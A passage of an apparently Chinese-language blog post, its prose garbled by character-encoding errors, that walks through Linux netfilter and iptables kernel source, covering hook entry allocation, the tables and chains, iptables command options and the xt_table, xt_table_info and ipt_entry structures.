*)reg;<br>new-&gt;hooks[nhooks].hook = reg-&gt;hook;<br>new-&gt;hooks[nhooks].priv = reg-&gt;priv;<br>inserted = <span class="hljs-literal">true</span>;<br>&#125;<br>nhooks++;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!inserted) &#123;<br>new_ops[nhooks] = (<span class="hljs-type">void</span> *)reg;<br>new-&gt;hooks[nhooks].hook = reg-&gt;hook;<br>new-&gt;hooks[nhooks].priv = reg-&gt;priv;<br>&#125;<br><br><span class="hljs-keyword">return</span> new;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>nf_hook_entries_get_hook_opså‡½æ•°ç”¨äºä»nf_hook_entriesä¸­å®šä½nf_hook_opsæŒ‡é’ˆæ•°ç»„çš„ä½ç½®ï¼ˆå­˜åœ¨nf_hook_entryæ•°ç»„ä¹‹åï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> nf_hook_ops **<span class="hljs-title function_">nf_hook_entries_get_hook_ops</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_entries *e)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> n = e-&gt;num_hook_entries;<br><span class="hljs-type">const</span> <span class="hljs-type">void</span> *hook_end;<br><br>hook_end = &amp;e-&gt;hooks[n]; <span class="hljs-comment">/* this is *past* -&gt;hooks[]! */</span><br><br><span class="hljs-keyword">return</span> (<span class="hljs-keyword">struct</span> nf_hook_ops **)hook_end;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>allocate_hook_entries_sizeç”³è¯·ç©ºé—´ï¼Œnf_hook_entrieså®é™…ä¸ŠåŒ…å«</p><ul><li>num_hook_entriesé¡¹</li><li>ä¸€ä¸ªnf_hook_entryæ•°ç»„</li><li>ä¸€ä¸ªnf_hook_opsæŒ‡é’ˆæ•°ç»„</li></ul><p>nf_hook_entryæ•°ç»„å’Œnf_hook_opsæŒ‡é’ˆæ•°ç»„ä¸­çš„é¡¹ä¸€ä¸€å¯¹åº”</p><p><em>è¿˜æœ‰ä¸€ä¸ªrcuçš„ç»“æ„ï¼Œå…ˆå¿½ç•¥(ï½oï¿£3ï¿£)ï½</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> nf_hook_entries *<span class="hljs-title function_">allocate_hook_entries_size</span><span class="hljs-params">(u16 num)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> *<span class="hljs-title">e</span>;</span><br><span class="hljs-type">size_t</span> alloc = <span class="hljs-keyword">sizeof</span>(*e) +<br>       <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> nf_hook_entry) * num +<br>       <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> nf_hook_ops *) * num +<br>       <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> nf_hook_entries_rcu_head);<br><br><span class="hljs-keyword">if</span> (num == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>e = kvzalloc(alloc, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (e)<br>e-&gt;num_hook_entries = num;<br><span class="hljs-keyword">return</span> e;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>æ›´æ–°åçš„ç»“æ„åº”è¯¥æ˜¯è¿™æ ·çš„ğŸ‘‡</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/new_nf_hook.png" class title="new_nf_hook"><h1 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h1><p>ç”±äºæŸä¸ªå¼ºè¿«ç—‡éè¦æŠŠè¿™æ¡é“¾å…¨éƒ½æ‹ä¸€éï¼Œå·¥ä½œé‡++</p><h2 id="iptablesä½¿ç”¨"><a href="#iptablesä½¿ç”¨" class="headerlink" title="iptablesä½¿ç”¨"></a>iptablesä½¿ç”¨</h2><h3 id="å››è¡¨äº”é“¾"><a href="#å››è¡¨äº”é“¾" class="headerlink" title="å››è¡¨äº”é“¾"></a>å››è¡¨äº”é“¾</h3><ul><li>å››è¡¨ï¼ˆè¿˜æœ‰å…¶ä»–è¡¨æ¯”å¦‚securityï¼Œå¿½ç•¥ï¼‰<ul><li>filterï¼šè¿‡æ»¤ï¼Œå†…æ ¸æ¨¡å— <strong>iprables_filter</strong></li><li>natï¼šç½‘ç»œåœ°å€è½¬æ¢ï¼ˆç›®æ ‡ipæˆ–è€…æºipï¼‰ï¼Œå†…æ ¸æ¨¡å— <strong>iptables_nat</strong></li><li>mangleï¼šæ‹†è§£æŠ¥æ–‡ï¼Œä¿®æ”¹ï¼Œé‡æ–°å°è£…ï¼Œå†…æ ¸æ¨¡å— <strong>iptables_mangle</strong></li><li>rawï¼šå…³é—­natè¡¨ä¸Šå¯ç”¨çš„è¿æ¥è¿½è¸ªæœºåˆ¶ï¼Œå†…æ ¸æ¨¡å— <strong>iptables_raw</strong></li></ul></li><li>äº”é“¾ï¼ˆè¯¦æƒ…è§ä¸ŠhookæŒ‚è½½ğŸ‘†ï¼‰<ul><li>PREROUTING</li><li>INPUT</li><li>OUTPUT</li><li>FORWARD</li><li>POSTROUTING</li></ul></li></ul><p>è¡¨é“¾å…³ç³»ï¼Œä¼˜å…ˆçº§å‘ä¸‹é€’å‡</p><table><thead><tr><th>è¡¨ &#x2F; é“¾</th><th>PREROUTING</th><th>INPUT</th><th>OUTPUT</th><th>FORWARD</th><th>POSTROUTING</th></tr></thead><tbody><tr><td>raw</td><td>âˆš</td><td></td><td>âˆš</td><td></td><td></td></tr><tr><td>mangle</td><td>âˆš</td><td>âˆš</td><td>âˆš</td><td>âˆš</td><td>âˆš</td></tr><tr><td>nat</td><td>âˆš</td><td>âˆš</td><td>âˆš</td><td></td><td>âˆš</td></tr><tr><td>filter</td><td></td><td>âˆš</td><td>âˆš</td><td>âˆš</td><td></td></tr></tbody></table><h3 id="è§„åˆ™"><a href="#è§„åˆ™" class="headerlink" title="è§„åˆ™"></a>è§„åˆ™</h3><p>ä¸€æ¡è§„åˆ™ç”± <strong>åŒ¹é…æ¡ä»¶ï¼ˆmatchï¼‰</strong> å’Œ <strong>å¤„ç†åŠ¨ä½œï¼ˆtargetï¼‰</strong> æ„æˆï¼ŒåŒ¹é…æ¡ä»¶åˆåˆ†ä¸º <strong>åŸºæœ¬åŒ¹é…æ¡ä»¶</strong> å’Œ <strong>æ‰©å±•åŒ¹é…æ¡ä»¶</strong></p><ul><li>åŒ¹é…æ¡ä»¶<ul><li>åŸºæœ¬åŒ¹é…æ¡ä»¶<ul><li>æºIP</li><li>ç›®çš„IP</li></ul></li><li>æ‰©å±•åŒ¹é…æ¡ä»¶ï¼ˆé€šå¸¸ä»¥æ¨¡å—å½¢å¼å­˜åœ¨ï¼Œæ¨¡å—å¯ä»¥æŒ‰éœ€å®‰è£…ï¼‰<ul><li>æºç«¯å£</li><li>ç›®æ ‡ç«¯å£</li></ul></li></ul></li><li>å¤„ç†åŠ¨ä½œ<ul><li>ACCEPTï¼šå…è®¸æ•°æ®åŒ…é€šè¿‡</li><li>DROPï¼šç›´æ¥ä¸¢å¼ƒæ•°æ®åŒ…ï¼Œä¸ç»™ä»»ä½•å›åº”ä¿¡æ¯</li><li>REJECTï¼šæ‹’ç»æ•°æ®åŒ…é€šè¿‡ï¼Œå¿…è¦æ—¶ä¼šç»™æ•°æ®å‘é€ç«¯ä¸€ä¸ªå“åº”çš„ä¿¡æ¯ï¼Œå®¢æˆ·ç«¯åˆšè¯·æ±‚å°±ä¼šæ”¶åˆ°æ‹’ç»çš„ä¿¡æ¯</li><li>SNATï¼šæºåœ°å€è½¬æ¢ï¼Œè§£å†³å†…ç½‘ç”¨æˆ·ç”¨åŒä¸€ä¸ªå…¬ç½‘åœ°å€ä¸Šç½‘çš„é—®é¢˜</li><li>MASQUERADEï¼šæ˜¯SNATçš„ä¸€ç§ç‰¹æ®Šå½¢å¼ï¼Œé€‚ç”¨äºåŠ¨æ€çš„ã€ä¸´æ—¶ä¼šå˜çš„ipä¸Š</li><li>DNATï¼šç›®æ ‡åœ°å€è½¬æ¢</li><li>REDIRECTï¼šåœ¨æœ¬æœºåšç«¯å£æ˜ å°„</li><li>LOGï¼šåœ¨&#x2F;var&#x2F;log&#x2F;messagesæ–‡ä»¶ä¸­è®°å½•æ—¥å¿—ä¿¡æ¯ï¼Œç„¶åå°†æ•°æ®åŒ…ä¼ é€’ç»™ä¸‹ä¸€æ¡è§„åˆ™ï¼Œä¹Ÿå°±æ˜¯è¯´é™¤äº†è®°å½•ä»¥å¤–ä¸å¯¹æ•°æ®åŒ…åšä»»ä½•å…¶ä»–æ“ä½œï¼Œä»ç„¶è®©ä¸‹ä¸€æ¡è§„åˆ™å»åŒ¹é…</li></ul></li></ul><h3 id="å‘½ä»¤æ ¼å¼"><a href="#å‘½ä»¤æ ¼å¼" class="headerlink" title="å‘½ä»¤æ ¼å¼"></a>å‘½ä»¤æ ¼å¼</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">iptables [-t è¡¨]<br>         å‘½ä»¤é€‰é¡¹<br>         [é“¾]<br>         [åŒ¹é…é€‰é¡¹]<br>         [æ“ä½œé€‰é¡¹]<br></code></pre></td></tr></table></figure><ul><li><p>å‘½ä»¤é€‰é¡¹</p><table><thead><tr><th align="left">é€‰é¡¹å</th><th align="left">åŠŸèƒ½åŠç‰¹ç‚¹</th></tr></thead><tbody><tr><td align="left">-A â€“append</td><td align="left">åœ¨æŒ‡å®šé“¾çš„æœ«å°¾æ·»åŠ ä¸€æ¡æ–°çš„è§„åˆ™</td></tr><tr><td align="left">-D â€“delete</td><td align="left">åˆ é™¤æŒ‡å®šé“¾ä¸­çš„æŸä¸€æ¡è§„åˆ™ï¼ŒæŒ‰è§„åˆ™åºå·æˆ–å†…å®¹ç¡®å®šè¦åˆ é™¤çš„è§„åˆ™</td></tr><tr><td align="left">-I â€“insert</td><td align="left">åœ¨æŒ‡å®šé“¾ä¸­æ’å…¥ä¸€æ¡æ–°çš„è§„åˆ™ï¼Œé»˜è®¤åœ¨é“¾çš„å¼€å¤´æ’å…¥</td></tr><tr><td align="left">-R â€“replace</td><td align="left">ä¿®æ”¹ã€æ›¿æ¢æŒ‡å®šé“¾ä¸­çš„ä¸€æ¡è§„åˆ™ï¼ŒæŒ‰è§„åˆ™åºå·æˆ–å†…å®¹ç¡®å®š</td></tr><tr><td align="left">-F â€“flush</td><td align="left">æ¸…ç©ºæŒ‡å®šé“¾ä¸­çš„æ‰€æœ‰è§„åˆ™ï¼Œé»˜è®¤æ¸…ç©ºè¡¨ä¸­æ‰€æœ‰é“¾çš„å†…å®¹</td></tr><tr><td align="left">-N â€“new</td><td align="left">æ–°å»ºä¸€æ¡ç”¨æˆ·è‡ªå·±å®šä¹‰çš„è§„åˆ™é“¾</td></tr><tr><td align="left">-X â€“delete-chain</td><td align="left">åˆ é™¤æŒ‡å®šè¡¨ä¸­ç”¨æˆ·è‡ªå®šä¹‰çš„è§„åˆ™é“¾</td></tr><tr><td align="left">-P â€“policy</td><td align="left">è®¾ç½®æŒ‡å®šé“¾çš„é»˜è®¤ç­–ç•¥</td></tr><tr><td align="left">-F, â€“flush</td><td align="left">æ¸…ç©ºæŒ‡å®šé“¾ä¸Šé¢çš„æ‰€æœ‰è§„åˆ™ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šé“¾ï¼Œæ¸…ç©ºè¡¨ä¸Šæ‰€æœ‰é“¾çš„æ‰€æœ‰è§„åˆ™</td></tr><tr><td align="left">-Z, â€“zero</td><td align="left">æŠŠæŒ‡å®šé“¾æˆ–è¡¨ä¸­çš„æ‰€æœ‰é“¾ä¸Šçš„æ‰€æœ‰è®¡æ•°å™¨æ¸…é›¶</td></tr><tr><td align="left">-L â€“list</td><td align="left">åˆ—å‡ºæŒ‡å®šé“¾ä¸­çš„æ‰€æœ‰çš„è§„åˆ™è¿›è¡ŒæŸ¥çœ‹ï¼Œé»˜è®¤åˆ—å‡ºè¡¨ä¸­æ‰€æœ‰é“¾çš„å†…å®¹</td></tr><tr><td align="left">-S â€“list-rules</td><td align="left">ä»¥åŸå§‹æ ¼å¼åˆ—å‡ºé“¾ä¸­æ‰€æœ‰è§„åˆ™</td></tr><tr><td align="left">-v â€“verbose</td><td align="left">æŸ¥çœ‹è§„åˆ™åˆ—è¡¨æ—¶æ˜¾ç¤ºè¯¦ç»†çš„ä¿¡æ¯</td></tr><tr><td align="left">-n â€“numeric</td><td align="left">ç”¨æ•°å­—å½¢å¼æ˜¾ç¤ºè¾“å‡ºç»“æœï¼Œå¦‚æ˜¾ç¤ºä¸»æœºçš„ IP åœ°å€è€Œä¸æ˜¯ä¸»æœºå</td></tr><tr><td align="left">â€“line-number</td><td align="left">æŸ¥çœ‹è§„åˆ™åˆ—è¡¨æ—¶ï¼ŒåŒæ—¶æ˜¾ç¤ºè§„åˆ™åœ¨é“¾ä¸­çš„é¡ºåºå·</td></tr></tbody></table></li><li><p>åŒ¹é…é€‰é¡¹</p><table><thead><tr><th align="left">é€‰é¡¹å</th><th align="left">åŠŸèƒ½åŠç‰¹ç‚¹</th></tr></thead><tbody><tr><td align="left">-i â€“in-interface</td><td align="left">åŒ¹é…è¾“å…¥æ¥å£ï¼Œå¦‚ eth0ï¼Œeth1</td></tr><tr><td align="left">-o â€“out-interface</td><td align="left">åŒ¹é…è¾“å‡ºæ¥å£</td></tr><tr><td align="left">-p â€“proto</td><td align="left">åŒ¹é…åè®®ç±»å‹ï¼Œå¦‚ TCPã€UDP å’Œ ICMPç­‰</td></tr><tr><td align="left">-s â€“source</td><td align="left">åŒ¹é…çš„æºåœ°å€</td></tr><tr><td align="left">â€“sport</td><td align="left">åŒ¹é…çš„æºç«¯å£å·</td></tr><tr><td align="left">-d â€“destination</td><td align="left">åŒ¹é…çš„ç›®çš„åœ°å€</td></tr><tr><td align="left">â€“dport</td><td align="left">åŒ¹é…çš„ç›®çš„ç«¯å£å·</td></tr><tr><td align="left">-m â€“match</td><td align="left">åŒ¹é…è§„åˆ™æ‰€ä½¿ç”¨çš„è¿‡æ»¤æ¨¡å—</td></tr></tbody></table></li><li><p>æ“ä½œé€‰é¡¹</p><p>èˆ¬ä¸º <strong>-j å¤„ç†åŠ¨ä½œ</strong> çš„å½¢å¼ï¼Œå¤„ç†åŠ¨ä½œåŒ…æ‹¬ACCEPTï¼ŒDROPï¼ŒRETURNï¼ŒREJECTï¼ŒDNATï¼ŒSNATç­‰</p></li></ul><h2 id="iptablesç›¸å…³æºç "><a href="#iptablesç›¸å…³æºç " class="headerlink" title="iptablesç›¸å…³æºç "></a>iptablesç›¸å…³æºç </h2><h3 id="iptablesæ•°æ®ç»“æ„"><a href="#iptablesæ•°æ®ç»“æ„" class="headerlink" title="iptablesæ•°æ®ç»“æ„"></a>iptablesæ•°æ®ç»“æ„</h3><p>å›é¡¾ä¸€ä¸‹iptableså‘½ä»¤çš„æ ¼å¼</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">iptables [-t è¡¨]<br>         å‘½ä»¤é€‰é¡¹<br>         [é“¾]<br>         [åŒ¹é…é€‰é¡¹]<br>         [æ“ä½œé€‰é¡¹]<br></code></pre></td></tr></table></figure><p>å†æ”¾ä¸€å¼ å›¾</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/table.png" class title="table"><p>æ¥ä¸‹æ¥çš„ç»“æ„ä½“éƒ½å¯¹åº”ç€å‘½ä»¤æ ¼å¼å’Œå›¾çœ‹</p><ul><li><p><strong>xt_table</strong> è¡¨ç¤ºâ€œå››è¡¨äº”é“¾â€ä¸­çš„è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_table</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> valid_hooks;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_table_info</span> *<span class="hljs-title">private</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">module</span> *<span class="hljs-title">me</span>;</span><br><span class="hljs-type">u_int8_t</span> af;<br><span class="hljs-type">int</span> priority;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> name[XT_TABLE_MAXNAMELEN];<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p>listï¼šxt_tableä»¥é“¾è¡¨å‚¨å­˜</p></li><li><p>valid_hooksï¼šç”¨æ©ç çš„æ–¹å¼è¡¨ç¤ºæœ‰å“ªäº›hookï¼Œå¦‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">.valid_hooks= (<span class="hljs-number">1</span> &lt;&lt; NF_INET_PRE_ROUTING) |<br>  (<span class="hljs-number">1</span> &lt;&lt; NF_INET_POST_ROUTING) |<br>  (<span class="hljs-number">1</span> &lt;&lt; NF_INET_LOCAL_OUT) |<br>  (<span class="hljs-number">1</span> &lt;&lt; NF_INET_LOCAL_IN),<br></code></pre></td></tr></table></figure></li><li><p>privateï¼šæŒ‡å‘å‘½ä»¤çš„æè¿°ç»“æ„ä½“ <strong>xt_table_info</strong></p></li><li><p>opsï¼šæŒ‡å‘ä¹‹å‰åˆ†æè¿‡çš„nf_hook_opsç»“æ„ä½“</p></li><li><p>afï¼šåè®®ç°‡</p></li><li><p>priorityï¼šä¼˜å…ˆçº§</p></li><li><p>nameï¼šè¡¨åï¼Œå¦‚natï¼Œfilterï¼Œmangle</p></li></ul></li><li><p><strong>xt_table_info</strong> è¡¨ç¤ºè¡¨ä¸­çš„å‘½ä»¤</p><p><em>æ³¨ï¼šæ‰€æœ‰çš„idxè¡¨ç¤ºentries[]çš„index</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_table_info</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> number;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> initial_entries;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hook_entry[NF_INET_NUMHOOKS];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> underflow[NF_INET_NUMHOOKS];<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> stacksize;<br><span class="hljs-type">void</span> ***jumpstack;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> entries[] __aligned(<span class="hljs-number">8</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>sizeï¼štableçš„å¤§å°</li><li>numberï¼šåŒ…å«çš„entryä¸ªæ•°ï¼Œå‘½ä»¤çš„æ¡æ•°</li><li>initial_entriesï¼štableçš„èµ·å§‹idx</li><li>hook_entryï¼šæ¯ä¸€æ¡é“¾çš„èµ·å§‹idx</li><li>underflowï¼šæ¯ä¸€æ¡é“¾çš„ç»“æŸidx</li><li>stacksizeï¼šæ ˆå¤§å°</li><li>jumpstackï¼šç­‰åŒäº jumpstack[cpuid][entry*]<ul><li>å½“å‘½ä»¤ä¸­å‘ç”Ÿäº†jumpï¼ˆAâ†’Bï¼‰æ—¶ï¼špush A-&gt;idx</li><li>å½“å‘½ä»¤çš„targetä¸ºRETURNæ—¶ï¼špop A-&gt;idxï¼Œç»§ç»­æ‰§è¡Œ</li></ul></li><li>entriesï¼š<strong>ipt_entry</strong> æ•°ç»„ï¼Œä¸€ä¸ªentryè¡¨ç¤ºä¸€æ¡å‘½ä»¤</li></ul></li><li><p><strong>ipt_entry</strong> ä¸€ä¸ªentryè¡¨ç¤ºä¸€æ¡å‘½ä»¤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_entry</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_ip</span> <span class="hljs-title">ip</span>;</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nfcache;<br><br>__u16 target_offset;<br>__u16 next_offset;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> comefrom;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_counters</span> <span class="hljs-title">counters</span>;</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> elems[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>ipï¼šåŸºæœ¬åŒ¹é…IP</li><li>target_offsetï¼štargetå…ƒç´ çš„åœ°å€ï¼Œ<strong>elems + sizeof(xt_match) * numof(matchs)</strong></li><li>next_offsetï¼šä¸‹ä¸€ä¸ªipt_entryçš„åœ°å€</li><li>comefromï¼šä»å“ªä¸ªentryæ¥çš„</li><li>countersï¼špacketå’Œbyteçš„è®¡æ•°å™¨</li><li>elemsï¼šä¿å­˜äº† <strong>xt_match</strong> å’Œ <strong>xt_target</strong><ul><li>elemsçš„åœ°å€å³xt_matchçš„åœ°å€</li><li>xt_targetçš„åœ°å€ç”±target_offsetæŒ‡å®š</li></ul></li></ul></li></ul><h3 id="xt-tableå’Œnetçš„è¿æ¥"><a href="#xt-tableå’Œnetçš„è¿æ¥" class="headerlink" title="xt_tableå’Œnetçš„è¿æ¥"></a>xt_tableå’Œnetçš„è¿æ¥</h3><p>æˆ‘ä»¬ä» <strong>xt_register_table</strong> ä¸­å¯ä»¥çª¥è§ <strong>xt_table</strong> æ˜¯æ€ä¹ˆå‚¨å­˜åœ¨ <strong>ç½‘ç»œå‘½åç©ºé—´ net ç»“æ„ä½“</strong> ä¸­çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> xt_table *<span class="hljs-title function_">xt_register_table</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> xt_table *input_table,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> xt_table_info *bootstrap,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> xt_table_info *newinfo)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_pernet</span> *<span class="hljs-title">xt_net</span> =</span> net_generic(net, xt_pernet_id);<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_table</span> *<span class="hljs-title">t</span>, *<span class="hljs-title">table</span>;</span><br>    <br>list_add(&amp;table-&gt;<span class="hljs-built_in">list</span>, &amp;xt_net-&gt;tables[table-&gt;af]);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>xt_tableåœ¨netä¸­çš„å­˜å‚¨ä¾èµ–æˆå‘˜ <strong>gen</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> &#123;</span><br>    <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_generic</span> __<span class="hljs-title">rcu</span>*<span class="hljs-title">gen</span>;</span><br><br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>net_genericç»“æ„ä½“å’Œxt_pernetç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_generic</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu</span>;</span><br>&#125; s;<br><br><span class="hljs-type">void</span> *ptr[<span class="hljs-number">0</span>];<br>&#125;;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_pernet</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">tables</span>[<span class="hljs-title">NFPROTO_NUMPROTO</span>];</span><br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>net_genericå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">net_generic</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> net *net, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> id)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_generic</span> *<span class="hljs-title">ng</span>;</span><br><span class="hljs-type">void</span> *ptr;<br><br>rcu_read_lock();<br>ng = rcu_dereference(net-&gt;gen);<br>ptr = ng-&gt;ptr[id];<br>rcu_read_unlock();<br><br><span class="hljs-keyword">return</span> ptr;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>ä¸è€ƒè™‘rcuçš„è¯å…¶å®å°±æ˜¯</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/gen.png" class title="gen"></li></ul><h3 id="xt-tableå’Œhookçš„æ³¨å†Œ"><a href="#xt-tableå’Œhookçš„æ³¨å†Œ" class="headerlink" title="xt_tableå’Œhookçš„æ³¨å†Œ"></a>xt_tableå’Œhookçš„æ³¨å†Œ</h3><p>å››è¡¨éƒ½æœ‰å„è‡ªçš„å†…æ ¸æ¨¡å—ï¼Œä»¥filterä¸ºä¾‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">module_init(iptable_filter_init);<br>module_exit(iptable_filter_fini);<br></code></pre></td></tr></table></figure><p><strong>iptable_filter_init</strong> çš„å‡½æ•°è°ƒç”¨å…³ç³»å›¾</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/function1.png" class 